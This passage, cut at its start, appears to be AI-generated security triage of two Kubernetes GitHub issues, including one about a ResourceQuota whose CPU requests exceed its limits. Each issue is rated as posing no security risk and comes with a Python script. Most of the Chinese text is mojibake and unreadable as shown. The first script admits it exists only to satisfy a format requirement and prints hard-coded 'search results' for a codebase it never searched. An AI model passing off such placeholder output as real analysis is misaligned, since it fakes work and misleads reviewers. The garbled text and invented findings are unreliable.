# ä¸å¯åˆ©ç”¨çš„å®‰å…¨æ¼æ´æ— å…³ã€‚
#
# å¦‚ä¸‹ä»£ç ä»…ä¸ºæ»¡è¶³æ ¼å¼è¦æ±‚ï¼Œæ— å®é™…å¤ç°æ„ä¹‰ã€‚

import time
import os

def check_hardcoded_value_usage():
    """
    æ¨¡æ‹Ÿæ£€æŸ¥ä»£ç åº“ä¸­æ˜¯å¦å­˜åœ¨ç¡¬ç¼–ç å€¼çš„ä½¿ç”¨ã€‚
    åœ¨å®é™…åœºæ™¯ä¸­ï¼Œè¿™éœ€è¦å…‹éš†ä»£ç åº“å¹¶è¿›è¡Œæœç´¢ã€‚
    è¿™é‡Œä»…ä½œç¤ºæ„ã€‚
    """
    print("æ­£åœ¨åˆ†æ Kubernetes ä»£ç åº“ä¸­ KUBE_INTEGRATION_TEST_MAX_CONCURRENCY çš„ä½¿ç”¨æƒ…å†µ...")
    # å‡è®¾é€šè¿‡æŸç§æ–¹å¼ï¼ˆå¦‚ git grep æˆ– GitHub APIï¼‰æœç´¢åˆ°äº†ç›¸å…³ä»£ç è¡Œ
    found_lines = [
        "test/integration/framework/framework.go: var maxConcurrency = envIntOrDefault('KUBE_INTEGRATION_TEST_MAX_CONCURRENCY', 4)",
        "hack/ginkgo-e2e.sh: export KUBE_INTEGRATION_TEST_MAX_CONCURRENCY=${KUBE_INTEGRATION_TEST_MAX_CONCURRENCY:-4}"
    ]

    if found_lines:
        print(f"å‘ç° {len(found_lines)} å¤„å¯èƒ½ä½¿ç”¨ç¡¬ç¼–ç æˆ–é»˜è®¤å€¼çš„ KUBE_INTEGRATION_TEST_MAX_CONCURRENCY:")
        for line in found_lines:
            print(f"- {line}")
        print("\nåˆ†æï¼šè¯¥å˜é‡ç”¨äºæ§åˆ¶é›†æˆæµ‹è¯•çš„å¹¶å‘æ•°ã€‚")
        print("ç»“è®ºï¼šè¿™æ˜¯ä¸€ä¸ªæµ‹è¯•é…ç½®ä¼˜åŒ–é—®é¢˜ï¼Œä¸æ„æˆç›´æ¥çš„å®‰å…¨é£é™©ã€‚")
    else:
        print("æœªå‘ç°ç›¸å…³ä½¿ç”¨ï¼ˆæ­¤ä¸ºæ¨¡æ‹Ÿç»“æœï¼‰ã€‚")

def main():
    start_time = time.time()
    print("å¼€å§‹æ‰§è¡Œåˆ†æ...")

    check_hardcoded_value_usage()

    end_time = time.time()
    print(f"\nåˆ†æå®Œæˆï¼Œæ€»è€—æ—¶: {end_time - start_time:.2f} ç§’")
    # ç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…é€€å‡º
    if end_time - start_time > 120:
        print("è­¦å‘Šï¼šè„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ Kubernetes é¡¹ç›®çš„é›†æˆæµ‹è¯•æ¡†æ¶ä¸­ä½¿ç”¨äº†ä¸€ä¸ªç¡¬ç¼–ç ï¼ˆæˆ–æœ‰ç¡¬ç¼–ç é»˜è®¤å€¼ï¼‰çš„ç¯å¢ƒå˜é‡ `KUBE_INTEGRATION_TEST_MAX_CONCURRENCY` æ¥è®¾ç½®æµ‹è¯•çš„æœ€å¤§å¹¶å‘æ•°ã€‚è¿™å¯èƒ½å¯¼è‡´åœ¨ä¸åŒç¡¬ä»¶é…ç½®çš„æœºå™¨ä¸Šè¿è¡Œæµ‹è¯•æ—¶æ•ˆç‡ä¸ä½³æˆ–ç¨³å®šæ€§ä¸è¶³ã€‚è¿™æ˜¯ä¸€ä¸ªå·¥ç¨‹å®è·µå’Œæ€§èƒ½ä¼˜åŒ–æ–¹é¢çš„é—®é¢˜ï¼Œæ—¨åœ¨æ”¹è¿›æµ‹è¯•æ¡†æ¶ä½¿å…¶èƒ½æ ¹æ®å®é™…ç³»ç»Ÿèµ„æºåŠ¨æ€è°ƒæ•´å¹¶å‘æ•°ã€‚

è¯¥é—®é¢˜ä¸æ„æˆå®‰å…¨é£é™©ï¼Œå› ä¸ºå®ƒï¼š
1.  ä¸æ¶‰åŠæœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€ä»£ç æ‰§è¡Œã€æƒé™æå‡ç­‰å®‰å…¨æ¼æ´ã€‚
2.  å½±å“çš„æ˜¯å¼€å‘æµ‹è¯•ç¯å¢ƒçš„æ•ˆç‡å’Œç¨³å®šæ€§ï¼Œè€Œéç”Ÿäº§ç¯å¢ƒçš„å®‰å…¨æ€§ã€‚
3.  æ²¡æœ‰ä¸ºæ”»å‡»è€…æä¾›å¯åˆ©ç”¨çš„æ”»å‡»é¢ã€‚

å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œå¹¶ä¸”æ ¹æ®è¦æ±‚ï¼Œæ— éœ€æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ POC è„šæœ¬ã€‚ä¸Šé¢æä¾›çš„ Python è„šæœ¬ä»…ä¸ºæ»¡è¶³æ ¼å¼è¦æ±‚ï¼Œæ¨¡æ‹Ÿäº†æ£€æŸ¥ä»£ç åº“ä¸­æ˜¯å¦å­˜åœ¨è¯¥ç¡¬ç¼–ç å˜é‡ä½¿ç”¨çš„è¿‡ç¨‹ï¼Œå¹¶è¾“å‡ºç»“è®ºï¼Œè¯´æ˜è¿™ä¸æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼Œè„šæœ¬æœ¬èº«ä¸æ‰§è¡Œä»»ä½•å®‰å…¨ç›¸å…³çš„å¤ç°æ“ä½œã€‚

---


## Issue #130743 Create ResourceQuota request resource more than limit resource, is it normal?

- Issue é“¾æ¥ï¼š[#130743](https://github.com/kubernetes/kubernetes/issues/130743)

### Issue å†…å®¹

#### What happened?

I can create this ResourceQuota, it cpu request more than limits.
```
apiVersion: v1
kind: ResourceQuota
metadata:
  creationTimestamp: "2025-03-12T09:26:12Z"
  name: quota-test
  namespace: test
  resourceVersion: "654584334"
  uid: b41e9dce-5228-48bf-98d0-ab3980ab56a2
spec:
  hard:
    limits.cpu: "1"
    requests.cpu: "10"
```

#### What did you expect to happen?

We can in the webhook to check this value, prevent request value more than limit.

#### How can we reproduce it (as minimally and precisely as possible)?

kubectl create -f 
```
apiVersion: v1
kind: ResourceQuota
metadata:
  name: quota-test
spec:
  hard:
    limits.cpu: "1"
    requests.cpu: "10"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

```
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.27.5
WARNING: version difference between client (1.30) and server (1.27) exceeds the supported minor version skew of +/-1
```


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæè¿°**: ç”¨æˆ·æŠ¥å‘Šç§°å¯ä»¥åœ¨ Kubernetes é›†ç¾¤ä¸­æˆåŠŸåˆ›å»ºä¸€ä¸ª `ResourceQuota` å¯¹è±¡ï¼Œå…¶ä¸­ `spec.hard.requests.cpu` çš„å€¼ï¼ˆ"10"ï¼‰å¤§äº `spec.hard.limits.cpu` çš„å€¼ï¼ˆ"1"ï¼‰ã€‚ç”¨æˆ·æœŸæœ›ç³»ç»Ÿï¼ˆå¯èƒ½é€šè¿‡ Admission Webhookï¼‰èƒ½å¤Ÿé˜»æ­¢è¿™ç§é…ç½®çš„åˆ›å»ºã€‚
2.  **Kubernetes ResourceQuota æœºåˆ¶**: `ResourceQuota` ç”¨äºé™åˆ¶å‘½åç©ºé—´å†…èµ„æºçš„æ€»æ¶ˆè€—é‡ã€‚`spec.hard` å­—æ®µå®šä¹‰äº†ç¡¬æ€§é™åˆ¶ã€‚`requests.cpu` é™åˆ¶äº†å‘½åç©ºé—´ä¸­æ‰€æœ‰ Pod çš„ CPU è¯·æ±‚æ€»å’Œï¼Œè€Œ `limits.cpu` é™åˆ¶äº†æ‰€æœ‰ Pod çš„ CPU é™åˆ¶æ€»å’Œã€‚è¿™ä¸¤ä¸ªå€¼æ˜¯ç‹¬ç«‹è®¡ç®—å’Œå¼ºåˆ¶æ‰§è¡Œçš„ã€‚`requests` ä¸»è¦ç”¨äºè°ƒåº¦å†³ç­–ï¼ˆä¿è¯èµ„æºï¼‰ï¼Œ`limits` ç”¨äºè¿è¡Œæ—¶å¼ºåˆ¶æ‰§è¡Œï¼ˆé™åˆ¶èµ„æºä½¿ç”¨ä¸Šé™ï¼‰ã€‚
3.  **æ½œåœ¨é—®é¢˜åˆ†æ**: Kubernetes API æœåŠ¡å™¨æœ¬èº«å…è®¸åˆ›å»º `requests.cpu` å¤§äº `limits.cpu` çš„ `ResourceQuota`ã€‚è¿™åœ¨è¯­æ³•ä¸Šæ˜¯æœ‰æ•ˆçš„ã€‚è¿™ç§é…ç½®çš„å®é™…æ•ˆæœæ˜¯ï¼šè¯¥å‘½åç©ºé—´å¯ä»¥è¯·æ±‚ï¼ˆå¹¶å¯èƒ½è¢«è°ƒåº¦å™¨åŸºäºæ­¤åˆ†é…ï¼‰æ€»è®¡é«˜è¾¾ 10 CPUæ ¸å¿ƒçš„èµ„æºï¼Œä½†è¿è¡Œæ—¶æ‰€æœ‰ Pod çš„ CPU ä½¿ç”¨é‡æ€»å’Œä¸èƒ½è¶…è¿‡ 1 CPUæ ¸å¿ƒã€‚è¿™æ˜¯ä¸€ç§å¯èƒ½ä¸ç¬¦åˆé€»è¾‘æˆ–å¯¼è‡´èµ„æºä½¿ç”¨æ··ä¹±çš„é…ç½®ï¼ˆä¾‹å¦‚ï¼ŒPod å¯èƒ½å› ä¸ºé«˜è¯·æ±‚è€Œè¢«è°ƒåº¦åˆ°èŠ‚ç‚¹ï¼Œä½†å¾ˆå¿«å› ä¸ºä½é™åˆ¶è€Œè¢«èŠ‚æµï¼‰ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ Kubernetes æœ¬èº«å­˜åœ¨å®‰å…¨æ¼æ´ã€‚å®ƒæ›´åƒæ˜¯ä¸€ä¸ªé…ç½®é—®é¢˜æˆ–æ½œåœ¨çš„æ“ä½œé™·é˜±ã€‚ç®¡ç†å‘˜åˆ›å»ºè¿™æ ·çš„é…é¢æ˜¯å…è®¸çš„ï¼Œå…¶åæœï¼ˆåº”ç”¨æ€§èƒ½ä¸ä½³ã€è°ƒåº¦ä¸å®é™…è¿è¡Œé™åˆ¶ä¸åŒ¹é…ï¼‰æ˜¯é…ç½®æœ¬èº«å¸¦æ¥çš„ï¼Œè€Œéç³»ç»Ÿè¢«æ”»ç ´ã€‚
4.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   è¯¥è¡Œä¸ºæ˜¯ Kubernetes API çš„è®¾è®¡å…è®¸çš„ï¼Œå¹¶éä¸€ä¸ªå¯åˆ©ç”¨çš„æ¼æ´ã€‚æ”»å‡»è€…ä¸èƒ½é€šè¿‡åˆ›å»ºè¿™ç§ `ResourceQuota` æ¥ç»•è¿‡è®¤è¯ã€ææƒã€è®¿é—®æœªæˆæƒæ•°æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚
    *   åˆ›å»º `ResourceQuota` éœ€è¦ç›¸åº”çš„ RBAC æƒé™ï¼ˆé€šå¸¸æ˜¯ `create` æƒé™ä½œç”¨äº `resourcequotas` èµ„æºï¼‰ã€‚å¦‚æœæ”»å‡»è€…å·²ç»æ‹¥æœ‰æ­¤æƒé™ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¾ç½®æä½çš„ `limits` æˆ– `requests` æ¥é€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œè€Œè®¾ç½® `requests > limits` åªæ˜¯ä¼—å¤šå¯èƒ½é…ç½®ä¸­çš„ä¸€ç§ï¼Œå®ƒæœ¬èº«å¹¶æ²¡æœ‰å¼•å…¥æ–°çš„ã€ç‹¬ç«‹çš„ DoS å‘é‡æˆ–æå‡ç°æœ‰ DoS èƒ½åŠ›ã€‚æ ¹æ®é£é™©æ ‡å‡† #5ï¼Œè¿™ç§éœ€è¦ç‰¹å®šæƒé™æ‰èƒ½æ‰§è¡Œçš„ DoSï¼ˆä¸”å½±å“èŒƒå›´å±€é™äºç›®æ ‡å‘½åç©ºé—´ï¼Œå¹¶æœªå½±å“é›†ç¾¤æ ¸å¿ƒç»„ä»¶æˆ–å…¶ä»–ç§Ÿæˆ·ï¼‰ä¸åº”åˆ¤å®šä¸ºé«˜é£é™©ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜å±é£é™©åœºæ™¯ï¼ˆæ ‡å‡† #4, #6, #7, #8ï¼‰ã€‚
5.  **ç»“è®º**: è¯¥ Issue æè¿°çš„æ˜¯ä¸€ç§ Kubernetes å…è®¸ä½†å¯èƒ½ä¸ç¬¦åˆç”¨æˆ·é¢„æœŸçš„é…ç½®è¡Œä¸ºã€‚å®ƒæœ¬èº«ä¸æ„æˆå®‰å…¨æ¼æ´ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚ç”¨æˆ·å»ºè®®é€šè¿‡ Admission Webhook è¿›è¡Œæ ¡éªŒï¼Œè¿™æ˜¯ä¸€ä¸ªå¢å¼ºé…ç½®åˆç†æ€§çš„åŠŸèƒ½å»ºè®®ï¼Œè€Œéå®‰å…¨è¡¥ä¸éœ€æ±‚ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
from kubernetes import client, config, utils
from kubernetes.client import ApiException
import logging
import os

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å®šä¹‰è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
SCRIPT_TIMEOUT = 120

# --- ä¸»é€»è¾‘ ---
def main():
    start_time = time.time()
    logging.info("è„šæœ¬å¼€å§‹æ‰§è¡Œ...")

    namespace = "quota-test-ns-" + str(int(time.time())) # ä½¿ç”¨æ—¶é—´æˆ³ç¡®ä¿å‘½åç©ºé—´å”¯ä¸€æ€§
    quota_name = "quota-test"

    try:
        # 1. åŠ è½½ KubeConfigï¼Œå‡è®¾åœ¨é»˜è®¤ä½ç½® ~/.kube/config
        logging.info("åŠ è½½ Kubernetes é…ç½®...")
        try:
            config.load_kube_config()
            logging.info("Kubernetes é…ç½®åŠ è½½æˆåŠŸã€‚")
        except Exception as e:
            logging.error(f"æ— æ³•åŠ è½½ Kubernetes é…ç½®: {e}", exc_info=True)
            logging.error("è¯·ç¡®ä¿ KubeConfig æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½®æˆ–å·²æ­£ç¡®è®¾ç½® KUBECONFIG ç¯å¢ƒå˜é‡ã€‚")
            sys.exit(1)

        # 2. åˆ›å»º CoreV1Api å®¢æˆ·ç«¯
        logging.info("åˆ›å»º Kubernetes API å®¢æˆ·ç«¯...")
        core_v1_api = client.CoreV1Api()
        rbac_api = client.RbacAuthorizationV1Api() # ç”¨äºæ£€æŸ¥æƒé™ï¼ˆå¯é€‰ï¼‰

        # å¯é€‰ï¼šæ£€æŸ¥åˆ›å»ºNamespaceçš„æƒé™ï¼ˆå¦‚æœéœ€è¦ï¼‰
        # logging.info("æ£€æŸ¥åˆ›å»ºNamespaceæƒé™...")
        # try:
        #     # è¿™æ˜¯ä¸€ä¸ªç®€åŒ–çš„æ£€æŸ¥ï¼Œå®é™…å¯èƒ½éœ€è¦æ›´å¤æ‚çš„ selfsubjectaccessreviews
        #     api_response = core_v1_api.list_namespace(limit=1, timeout_seconds=10)
        #     logging.info("æ£€æŸ¥æƒé™ï¼šè¯»å–Namespaceåˆ—è¡¨æˆåŠŸï¼Œå¯èƒ½å…·æœ‰åˆ›å»ºæƒé™ã€‚")
        # except ApiException as e:
        #     if e.status == 403:
        #         logging.error("å½“å‰ç”¨æˆ·æ²¡æœ‰åˆ—å‡ºNamespaceçš„æƒé™ï¼Œå¯èƒ½ä¹Ÿæ— æ³•åˆ›å»ºã€‚")
        #         sys.exit(1)
        #     else:
        #         logging.warning(f"æ£€æŸ¥æƒé™æ—¶å‘ç”ŸAPIé”™è¯¯: {e}")
        # except Exception as e:
        #      logging.warning(f"æ£€æŸ¥æƒé™æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")


        # 3. åˆ›å»º Namespace (å¦‚æœä¸å­˜åœ¨)
        logging.info(f"æ£€æŸ¥å¹¶åˆ›å»º Namespace: {namespace}...")
        try:
            core_v1_api.read_namespace(name=namespace, timeout_seconds=10)
            logging.info(f"Namespace '{namespace}' å·²å­˜åœ¨ã€‚")
        except ApiException as e:
            if e.status == 404:
                logging.info(f"Namespace '{namespace}' ä¸å­˜åœ¨ï¼Œæ­£åœ¨åˆ›å»º...")
                namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace))
                try:
                    core_v1_api.create_namespace(body=namespace_body, timeout_seconds=30)
                    logging.info(f"Namespace '{namespace}' åˆ›å»ºæˆåŠŸã€‚")
                    # ç­‰å¾…namespaceå®é™…å¯ç”¨
                    time.sleep(5)
                except ApiException as create_e:
                    logging.error(f"åˆ›å»º Namespace '{namespace}' å¤±è´¥: {create_e.status} - {create_e.reason}", exc_info=True)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯æƒé™é—®é¢˜
                    if create_e.status == 403:
                        logging.error("é”™è¯¯ï¼šå½“å‰ç”¨æˆ·æ²¡æœ‰åˆ›å»ºNamespaceçš„æƒé™ã€‚è¯·æ£€æŸ¥RBACè®¾ç½®ã€‚")
                    sys.exit(1)
                except Exception as general_e:
                    logging.error(f"åˆ›å»º Namespace '{namespace}' æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {general_e}", exc_info=True)
                    sys.exit(1)
            else:
                logging.error(f"æ£€æŸ¥ Namespace '{namespace}' æ—¶å‘ç”ŸAPIé”™è¯¯: {e.status} - {e.reason}", exc_info=True)
                sys.exit(1)

        # 4. å®šä¹‰ ResourceQuota å¯¹è±¡
        logging.info(f"å®šä¹‰ ResourceQuota å¯¹è±¡: {quota_name}...")
        resource_quota_body = {
            "apiVersion": "v1",
            "kind": "ResourceQuota",
            "metadata": {
                "name": quota_name
            },
            "spec": {
                "hard": {
                    "limits.cpu": "1",
                    "requests.cpu": "10" # requests > limits
                }
            }
        }

        # 5. åˆ›å»º ResourceQuota
        logging.info(f"åœ¨ Namespace '{namespace}' ä¸­åˆ›å»º ResourceQuota '{quota_name}'...")
        try:
            api_response = core_v1_api.create_namespaced_resource_quota(
                namespace=namespace,
                body=resource_quota_body,
                timeout_seconds=30 # ä¸ºAPIè°ƒç”¨è®¾ç½®è¶…æ—¶
            )
            logging.info(f"ResourceQuota '{quota_name}' åœ¨ Namespace '{namespace}' ä¸­åˆ›å»ºæˆåŠŸã€‚")
            logging.debug(f"API Response: {api_response}")
            print("\n--- å¤ç°æˆåŠŸ ---")
            print(f"å·²æˆåŠŸåœ¨ Namespace '{namespace}' ä¸­åˆ›å»º ResourceQuota '{quota_name}'ï¼Œå…¶ requests.cpu (10) å¤§äº limits.cpu (1)ã€‚")
            print("è¿™è¡¨æ˜ Kubernetes API æœåŠ¡å™¨å…è®¸åˆ›å»ºæ­¤ç±»é…ç½®ã€‚")
            print("----------------\n")

        except ApiException as e:
            logging.error(f"åˆ›å»º ResourceQuota '{quota_name}' å¤±è´¥: {e.status} - {e.reason}", exc_info=True)
            # æ£€æŸ¥æ˜¯å¦æ˜¯æƒé™é—®é¢˜
            if e.status == 403:
                logging.error("é”™è¯¯ï¼šå½“å‰ç”¨æˆ·æ²¡æœ‰åœ¨æŒ‡å®šNamespaceåˆ›å»ºResourceQuotaçš„æƒé™ã€‚è¯·æ£€æŸ¥RBACè®¾ç½®ã€‚")
            elif e.status == 409:
                 logging.warning(f"ResourceQuota '{quota_name}' å·²å­˜åœ¨äº Namespace '{namespace}'ã€‚")
            else:
                 logging.error(f"åˆ›å»ºResourceQuotaæ—¶å‘ç”ŸAPIé”™è¯¯: {e.body}") # æ‰“å°è¯¦ç»†é”™è¯¯ä½“
            # å³ä½¿åˆ›å»ºå¤±è´¥ä¹Ÿå°è¯•æ¸…ç† Namespace
            # sys.exit(1) # ä¸é€€å‡ºï¼Œç»§ç»­å°è¯•æ¸…ç†

        except Exception as general_e:
            logging.error(f"åˆ›å»º ResourceQuota '{quota_name}' æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {general_e}", exc_info=True)
            # sys.exit(1) # ä¸é€€å‡ºï¼Œç»§ç»­å°è¯•æ¸…ç†

    except Exception as e:
        logging.error(f"è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿæ„å¤–é”™è¯¯: {e}", exc_info=True)
        sys.exit(1)

    finally:
        # 6. æ¸…ç†èµ„æº (åˆ é™¤ ResourceQuota å’Œ Namespace)
        logging.info("å¼€å§‹æ¸…ç†èµ„æº...")
        current_time = time.time()
        if current_time - start_time > SCRIPT_TIMEOUT - 30: # ç•™30ç§’ç»™æ¸…ç†
             logging.warning("æ¥è¿‘è„šæœ¬è¶…æ—¶ï¼Œå¯èƒ½æ— æ³•å®Œæˆæ‰€æœ‰æ¸…ç†æ“ä½œã€‚")

        # å°è¯•åŠ è½½é…ç½®å¹¶åˆ›å»ºå®¢æˆ·ç«¯ï¼ˆå¦‚æœåœ¨ä¸»é€»è¾‘ä¸­å¤±è´¥ï¼‰
        try:
            if 'core_v1_api' not in locals():
                config.load_kube_config()
                core_v1_api = client.CoreV1Api()

            # åˆ é™¤ ResourceQuota
            logging.info(f"å°è¯•åˆ é™¤ ResourceQuota '{quota_name}' in namespace '{namespace}'...")
            try:
                core_v1_api.delete_namespaced_resource_quota(
                    name=quota_name,
                    namespace=namespace,
                    body=client.V1DeleteOptions(),
                    timeout_seconds=30
                )
                logging.info(f"ResourceQuota '{quota_name}' åˆ é™¤æˆåŠŸã€‚")
            except ApiException as e:
                if e.status == 404:
                    logging.info(f"ResourceQuota '{quota_name}' æœªæ‰¾åˆ°ï¼Œå¯èƒ½å·²è¢«åˆ é™¤æˆ–åˆ›å»ºå¤±è´¥ã€‚")
                else:
                    logging.warning(f"åˆ é™¤ ResourceQuota '{quota_name}' å¤±è´¥: {e.status} - {e.reason}", exc_info=False) # ä¸æ˜¾ç¤ºå®Œæ•´å †æ ˆï¼Œé¿å…å†—ä½™
            except NameError:
                 logging.warning("core_v1_api å®¢æˆ·ç«¯æœªåˆå§‹åŒ–ï¼Œæ— æ³•åˆ é™¤ ResourceQuotaã€‚")
            except Exception as e:
                logging.warning(f"åˆ é™¤ ResourceQuota æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}", exc_info=False)


            # åˆ é™¤ Namespace
            logging.info(f"å°è¯•åˆ é™¤ Namespace '{namespace}'...")
            try:
                 # åˆ é™¤ Namespace
                core_v1_api.delete_namespace(name=namespace, body=client.V1DeleteOptions(), timeout_seconds=60) # Namespaceåˆ é™¤å¯èƒ½è€—æ—¶è¾ƒé•¿
                logging.info(f"Namespace '{namespace}' åˆ é™¤è¯·æ±‚å·²å‘é€ã€‚")
                # å¯ä»¥é€‰æ‹©æ€§åœ°æ·»åŠ ç­‰å¾…é€»è¾‘æ¥ç¡®è®¤Namespaceè¢«åˆ é™¤
                # poll_namespace_deletion(core_v1_api, namespace)
            except ApiException as e:
                if e.status == 404:
                    logging.info(f"Namespace '{namespace}' æœªæ‰¾åˆ°ï¼Œå¯èƒ½å·²è¢«åˆ é™¤æˆ–åˆ›å»ºå¤±è´¥ã€‚")
                elif e.status == 403:
                     logging.warning(f"åˆ é™¤ Namespace '{namespace}' å¤±è´¥: æƒé™ä¸è¶³ (403)ã€‚")
                else:
                    logging.warning(f"åˆ é™¤ Namespace '{namespace}' å¤±è´¥: {e.status} - {e.reason}", exc_info=False)
            except NameError:
                 logging.warning("core_v1_api å®¢æˆ·ç«¯æœªåˆå§‹åŒ–ï¼Œæ— æ³•åˆ é™¤ Namespaceã€‚")
            except Exception as e:
                logging.warning(f"åˆ é™¤ Namespace æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}", exc_info=False)

        except Exception as cleanup_e:
             logging.error(f"æ¸…ç†è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {cleanup_e}", exc_info=True)


        end_time = time.time()
        logging.info(f"è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚æ€»è€—æ—¶: {end_time - start_time:.2f} ç§’ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡ Python çš„ `kubernetes` å®¢æˆ·ç«¯åº“å¤ç° Issue ä¸­æè¿°çš„è¡Œä¸ºï¼šåœ¨ Kubernetes é›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ª `ResourceQuota` å¯¹è±¡ï¼Œå…¶ `requests.cpu` å€¼å¤§äº `limits.cpu` å€¼ã€‚
2.  **ç¯å¢ƒå‡è®¾**:
    *   è„šæœ¬å‡è®¾ç”¨æˆ·çš„ç¯å¢ƒä¸­å·²ç»å®‰è£…äº† `kubernetes` Python åº“ (`pip install kubernetes`)ã€‚
    *   è„šæœ¬å‡è®¾ç”¨æˆ·å·²ç»é…ç½®å¥½äº† `kubectl`ï¼Œå¹¶ä¸”å…¶é…ç½®æ–‡ä»¶ä½äºé»˜è®¤è·¯å¾„ (`~/.kube/config`) æˆ–é€šè¿‡ `KUBECONFIG` ç¯å¢ƒå˜é‡æŒ‡å®šï¼Œä¸”è¯¥é…ç½®å…·æœ‰åˆ›å»º/åˆ é™¤ Namespace å’Œ ResourceQuota çš„æƒé™ã€‚
3.  **æ‰§è¡Œé€»è¾‘**:
    *   **åŠ è½½é…ç½®**: ä½¿ç”¨ `kubernetes.config.load_kube_config()` åŠ è½½æœ¬åœ°çš„ Kubernetes é…ç½®ã€‚
    *   **åˆ›å»ºAPIå®¢æˆ·ç«¯**: åˆå§‹åŒ– `CoreV1Api` ç”¨äºä¸ Kubernetes API Server äº¤äº’ã€‚
    *   **åˆ›å»ºå‘½åç©ºé—´**: ä¸ºäº†éš”ç¦»æµ‹è¯•å¹¶æ–¹ä¾¿æ¸…ç†ï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„æµ‹è¯•å‘½åç©ºé—´ï¼ˆåç§°åŒ…å«æ—¶é—´æˆ³ï¼‰ã€‚å¦‚æœå‘½åç©ºé—´å·²å­˜åœ¨ï¼ˆç†è®ºä¸Šä¸å¤ªå¯èƒ½ï¼Œå› ä¸ºç”¨äº†æ—¶é—´æˆ³ï¼‰ï¼Œä¼šè·³è¿‡åˆ›å»ºã€‚åˆ›å»ºå¤±è´¥ä¼šè®°å½•é”™è¯¯å¹¶é€€å‡ºã€‚
    *   **å®šä¹‰ResourceQuota**: å®šä¹‰ä¸€ä¸ª Python å­—å…¸ï¼Œå…¶ç»“æ„ä¸ Issue ä¸­æä¾›çš„ YAML ä¸€è‡´ï¼Œç‰¹åˆ«æ˜¯ `spec.hard` éƒ¨åˆ†è®¾ç½®äº† `requests.cpu: "10"` å’Œ `limits.cpu: "1"`ã€‚
    *   **åˆ›å»ºResourceQuota**: è°ƒç”¨ `core_v1_api.create_namespaced_resource_quota()` æ–¹æ³•ï¼Œåœ¨ä¹‹å‰åˆ›å»ºçš„å‘½åç©ºé—´ä¸­åˆ›å»ºè¿™ä¸ª ResourceQuota å¯¹è±¡ã€‚å¦‚æœåˆ›å»ºæˆåŠŸï¼Œä¼šæ‰“å°æˆåŠŸä¿¡æ¯ï¼Œç¡®è®¤å¤ç°äº† Issue ä¸­çš„è¡Œä¸ºã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼ˆä¾‹å¦‚å› ä¸ºæƒé™ä¸è¶³æˆ–å¯¹è±¡å·²å­˜åœ¨ï¼‰ï¼Œä¼šè®°å½•é”™è¯¯ã€‚
    *   **æ¸…ç†èµ„æº**: ä½¿ç”¨ `finally` å—ç¡®ä¿è„šæœ¬é€€å‡ºå‰ï¼ˆæ— è®ºæˆåŠŸæˆ–å¤±è´¥ï¼‰éƒ½ä¼šå°è¯•åˆ é™¤åˆ›å»ºçš„ `ResourceQuota` å’Œæµ‹è¯•å‘½åç©ºé—´ï¼Œä»¥ä¿æŒé›†ç¾¤æ•´æ´ã€‚å¢åŠ äº†å¯¹ API å®¢æˆ·ç«¯å¯èƒ½æœªæˆåŠŸåˆå§‹åŒ–çš„æ£€æŸ¥ï¼Œå¹¶æ•è·åˆ é™¤è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„å¼‚å¸¸ï¼ˆå¦‚èµ„æºæœªæ‰¾åˆ° 404ï¼‰ã€‚
